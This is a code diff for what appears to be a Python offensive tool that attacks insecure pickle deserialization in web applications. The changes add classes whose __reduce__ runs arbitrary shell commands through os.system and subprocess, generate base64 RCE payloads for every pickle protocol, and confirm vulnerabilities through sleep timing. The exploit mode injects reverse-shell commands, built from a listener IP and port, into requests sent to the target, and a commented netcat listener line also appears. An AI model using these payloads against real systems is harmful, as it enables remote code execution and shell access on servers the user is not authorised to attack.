@@ -9,6 +9,7 @@ import time
 import sys
 import math
 import signal
+import subprocess
 
 import requests
 from requests import Request
@@ -27,11 +28,9 @@ def parse_args():
     # each of the four basic functionalities uses its own subparser to manage arguments
     subparsers = parent_parser.add_subparsers(dest='subparser_name')
 
-    # create the parser for the verify-object functionality
-    verify_parser = subparsers.add_parser('verify-object', help="Verify that the string is base64 serialized python pickle object")
-    # verify_parser.set_defaults(subcommand='verify')
-    verify_parser.add_argument('--object', required=False, help="Object to verify(base64)") #todo raw?
-    verify_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
+    # create the parser for the verify-pickle functionality
+    verify_parser = subparsers.add_parser('verify-pickle', help="Verify that the string is base64 serialized python pickle object")
+    verify_parser.add_argument('--object', required=False, help="Object to verify(base64)") # todo: raw?
     verify_parser.add_argument('--unsafe', required=False, action='store_true',
                                help='Use dangerous deserialization functions to verify if the string is serialized object.'
                                      'Dangerous! Should only be used when sure the provided object is safe to deserialize.')
@@ -66,7 +65,7 @@ def parse_args():
     global g_args
     g_args = parsed_args
 
-    if parsed_args.subparser_name == 'verify-object':
+    if parsed_args.subparser_name == 'verify-pickle':
         verify()
     elif parsed_args.subparser_name == 'generate-payload':
         generate_payload()
@@ -81,7 +80,7 @@ def parse_args():
 
 
 def verify() -> bool:
-    print("[+] Using verify module")
+    print("[+] Using verify module\n")
 
     if g_args.object:
         base64_encoded_object = str(g_args.object)
@@ -92,7 +91,8 @@ def verify() -> bool:
     try:
         pickle_object = base64.b64decode(base64_encoded_object)
     except Exception:
-        print_red("[-] Not valid base64.")
+        print_warning("[-] Not valid base64.")
+        print()
         return False
 
     confidence = None
@@ -105,7 +105,8 @@ def verify() -> bool:
         if pickle_object.endswith(pickle.STOP):
             confidence = "[+] Confidence: Low. Might be pickle object. Ends with pickle STOP opcode"
         else:
-            print_red("[-] Not a valid pickle object")
+            print_warning("[-] Not a valid pickle object")
+            print()
             return False
 
         # try to verify if provided object is pickle by disassembling it
@@ -118,10 +119,11 @@ def verify() -> bool:
                     contains_only_pickle_opcodes = False
 
             if contains_only_pickle_opcodes:
-                print_green("[+] Pickle object detected")
+                print_info("[+] Pickle object detected", greentext=True)
                 confidence = "[+] Confidence: High"
         except Exception:
-            print_red("[-] Not a valid pickle object")
+            print_warning("[-] Not a valid pickle object")
+            print()
             return False
 
     # try to deserialize object to verify
@@ -130,56 +132,104 @@ def verify() -> bool:
         print("[+] using --unsafe")
         try:
             pickle.loads(pickle_object)
-            print_green("[+] Pickle object detected")
+            print_info("[+] Pickle object detected", greentext=True)
             confidence = "[+] Confidence: Certain"
         except Exception:
-            print_red("[-] Not a valid pickle object")
+            print_warning("[-] Not a valid pickle object")
+            print()
             return False
 
-    print_green(confidence)
+    print_info(confidence)
     print()
     return True
 
 
+# relying on os module
+class os_rce_payload():
+    def __init__(self, command):
+        self.command = command
+    def __reduce__(self):
+        import os
+        return os.system, (self.command,)
+    
+
+# relying on subprocess module
+class subprocess_rce_payload():
+    def __init__(self, command):
+         self.command = str(command)
+    def __reduce__(self):
+           import subprocess
+           return (subprocess.check_output, (('/bin/sh','-c', self.command), 0))
+    
 
 
-def generate_payload(supplied_cmd:str = None) -> list[str]: # todo: nadodati na postojeci pickle objekt
+# execute python sleep
+# used in confirm-vuln module
+class pysleep_payload():
+    def __init__(self, amount):
+         self.amount = int(amount)
+    def __reduce__(self):
+           import time
+           return (time.sleep, (self.amount,))
 
-    if supplied_cmd is None: print("[+] Using generate-payload module")
+
+        
+
+def generate_payload() -> list[str]: # todo: nadodati na postojeci pickle objekt
+
+    print("[+] Using generate-payload module")
 
     cmd = None
-
-    # if the function is called without command provided as function arg
-    # read the command from script arguments or get user input
-    if supplied_cmd is None:
-        if g_args.cmd:
-            cmd = g_args.cmd
-        else:
-            cmd = input("[+] Enter your command: ")
+    
+    if g_args.cmd:
+        cmd = g_args.cmd
     else:
-        cmd = supplied_cmd
+        cmd = input("[+] Enter your command: ")
+   
 
-
-    class exploit():
-        def __init__(self, command):
-            self.command = command
-        def __reduce__(self):
-            return os.system, (self.command,)
-        
-        
-    if supplied_cmd is None: print("[+] Generating payloads ... \n")
+    print("[+] Generating payloads ... \n")
     payloads_list = []
 
+    print_info("[+] Payloads relying on os module: ")
+    print(f"  [+] Pickle protocols 0-{pickle.HIGHEST_PROTOCOL}")
     for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
-        payload = pickle.dumps(exploit(cmd), protocol=prot_num)
-        if supplied_cmd is None:
-            print(f"[+] Pickle protocol {prot_num}")
-            print("\t[+] Base64 encoded payload: ", base64.b64encode(payload).decode("utf-8"))
-            if g_args.raw:
-                print("\t[+] Raw bytes payload: ", payload)
+        payload = pickle.dumps(os_rce_payload(cmd), protocol=prot_num)
+        print(f"\t[+] Base64 encoded payload num #{prot_num}: ", base64.b64encode(payload).decode("utf-8"))
+        if g_args.raw:
+            print("\t[+] Raw bytes payload: ", payload)
+            print()
         payloads_list.append(base64.b64encode(payload).decode("utf-8"))
 
+
+    print()
+    print_info("[+] Payloads relying on subprocess module: ")
+    print(f"  [+] Pickle protocols 0-{pickle.HIGHEST_PROTOCOL}")
+    for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
+        payload = pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)
+        print(f"\t[+] Base64 encoded payload num #{prot_num}: ", base64.b64encode(payload).decode("utf-8"))
+        if g_args.raw:
+            print("\t[+] Raw bytes payload: ", payload)
+            print()
+        payloads_list.append(base64.b64encode(payload).decode("utf-8"))
+    
+    print()
+
     return payloads_list
+
+
+
+# no output just return payloads, called from confirm-vuln/exploit
+def generate_payload_silent(cmd) -> list[str]:
+        
+    payloads_list = []
+    for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
+        payload_os = base64.b64encode(pickle.dumps(os_rce_payload(cmd), protocol=prot_num)).decode("utf-8")
+        payload_subproc = base64.b64encode(pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)).decode("utf-8")
+        payloads_list.append(payload_os)
+        payloads_list.append(payload_subproc)
+
+    return payloads_list
+
 
 
 def read_file(path: str) -> list[str]:
@@ -254,13 +304,14 @@ def measure_avg_rtt(req_lines, http):
             try:
                 response = requests.Session().send(prepared_req, verify=False)
             except requests.exceptions.SSLError:
-                print_red("[+] SSL error. Use --http flag?")
+                print_warning("[+] SSL error. Use --http flag?")
+                print()
                 exit(1)
     
             total_rtt += response.elapsed.total_seconds()
 
         average_rtt = total_rtt/num_reqs 
-        print(f"[+] Average RTT is: {average_rtt} seconds.")
+        print(f"[+] Average RTT is: {round(average_rtt, 5)} seconds.")
         return average_rtt
 
 
@@ -286,8 +337,15 @@ def confirm_vuln():
         sleep_time = 5
 
 
-    # list of payloads(different pickle protocol)
-    payloads_list = generate_payload(f"sleep {sleep_time}")
+    # list of payloads(different pickle protocols, different modules for rce/executing sleep)
+    #todo: test with some prepickled sleep/timeout payloads
+    payloads_list = []
+    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time))).decode("utf-8"))
+    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+1))).decode("utf-8"))
+    payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+2))).decode("utf-8"))
+    payloads_list.extend(generate_payload_silent(f"sleep {sleep_time}"))
+    
+
 
     print("[+] Testing ...")
     for payload in payloads_list:
@@ -301,7 +359,8 @@ def confirm_vuln():
             else:
                 response = requests.Session().send(prepared_req, verify=False)
         except requests.exceptions.SSLError:
-            print_red("[+] SSL error. Use --http flag?")
+            print_warning("[+] SSL error. Use --http flag?")
+            print()
             exit(1)
 
         if response.elapsed.total_seconds() > sleep_time:
@@ -312,22 +371,22 @@ def confirm_vuln():
                 response2 = requests.Session().send(prepared_req, verify=False)
             
             if response2.elapsed.total_seconds() > sleep_time:
+                print()
                 print_green("\n[+] Tested web application is vulnerable!!!") 
-                print_green(f"[+] Payload causing sleep {sleep_time}: {payload}")
+                print_info(f"[+] Payload causing sleep {sleep_time}: {payload}")
                 print()
                 return
 
-    print_red("[+] The app seems to not be vulnerable")
+    print_info("[+] The app seems to not be vulnerable")
+    print()
 
-    #todo: test with some prepickled sleep/timeout payloads
-
+    
 
 
 
 
 def exploit():
     print("[+] Using exploit module")
-
 
     request = read_file(g_args.request)
 
@@ -345,19 +404,18 @@ def exploit():
         revshell_ip = input("[+] Enter listener ip (LHOST): ")
         revshell_port = input("[+] Enter listener port (LPORT): ")
 
-
-        user_input = input(f"[+] Start a local listener on port {revshell_port}? (y/N)")
-        if user_input.lower() == "y":
-            print_green(f"[+] Starting listener on {revshell_ip}:{revshell_port}")
-            # os.system(f"nc -lvnp  {revshell_port}")
-            # todo: treba napraviti to sa posebno dretvom da program ne za hanga
-            time.sleep(100) 
+        #todo
+        # user_input = input(f"[+] Start a local netcat listener on port {revshell_port}? (y/N)")
+        # if user_input.lower() == "y":
+        #     print_info(f"[+] Starting listener on {revshell_ip}:{revshell_port}")
+        #     # start a listener in separeate thread 
+        #     os.system(f"nc -lvnp  {revshell_port}")
 
 
         print("[+] Trying out reverse shell payloads ...")
         for rs_index, rs_cmd in enumerate(utils.reverse_shells):
             rs_cmd = rs_cmd.replace("ip_placeholder", revshell_ip).replace("port_placeholder", revshell_port).strip()
-            payloads_list = generate_payload(rs_cmd)
+            payloads_list = generate_payload_silent(rs_cmd)
             
             for num, payload in enumerate(payloads_list):
                 (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
@@ -386,9 +444,9 @@ def exploit():
         else:
             cmd = input("[+] Enter your command: ")
         
-        payloads_list = generate_payload(cmd)
+        payloads_list = generate_payload_silent(cmd)
 
-        print(f"[+] Sending requests with payload: {cmd}")
+        print(f"[+] Sending requests with payload executingl: {cmd}")
         for num, payload in enumerate(payloads_list):
             (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
             req = Request(method=method, url=url, headers=headers, data=data)
@@ -405,40 +463,64 @@ def exploit():
             print(f"\t[+] Sent request num #{num + 1} ")
 
         
-        print_green("\n[+] Done\n")
+        print()
+        print_info("[+] Done\n")
 
 
     
 def sig_handler(sig, frame):
-    print_red("[+] Caught Ctrl-c. Exiting...\n")
+    print()
+    print_warning("[+] Caught Ctrl-c. Exiting...\n")
     exit(1)
 
 
 def check_py_version():
     if sys.version_info < (3, 8):
-        print_red("[+] Python version 3.8 or newer is required")
-        print_red("[+] Quitting")
+        print()
+        print_warning("[+] Python version 3.8 or newer is required")
+        print_warning("[+] Quitting")
+        print()
         exit(1)
+
 
 def print_banner():
     print(utils.banner)
 
 
+class colors:
+    GREEN = '\033[92m'
+    RED = '\033[91m'
+    END = '\033[0m'
+    BOLD = '\033[1m'
+
+
+
+def print_info(text, greentext=False):
+     if greentext == False:
+          print(f"{colors.BOLD}[{colors.GREEN} INFO {colors.END}] {colors.BOLD}{text}{colors.END}")
+     else:
+          print(f"{colors.BOLD}[{colors.GREEN} INFO {colors.END}] {colors.BOLD}{colors.GREEN}{text}{colors.END}")
+
+
+def print_warning(text):
+    print(f"{colors.BOLD}[{colors.RED} WARNING {colors.END}]{colors.BOLD}{text}{colors.END}")
+
+
 def print_green(txt):
-    print("\033[92m {}\033[00m".format(txt))
+    print(f"{colors.GREEN}{txt}{colors.END}")
 
 
 def print_red(txt):
-    print("\033[91m {}\033[00m".format(txt))
+    print(f"{colors.RED}{txt}{colors.END}")
 
 
 if __name__ == '__main__':
-
 
     signal.signal(signal.SIGINT, sig_handler)
     print_banner()
     check_py_version()
     parse_args()
+    
 
 
 
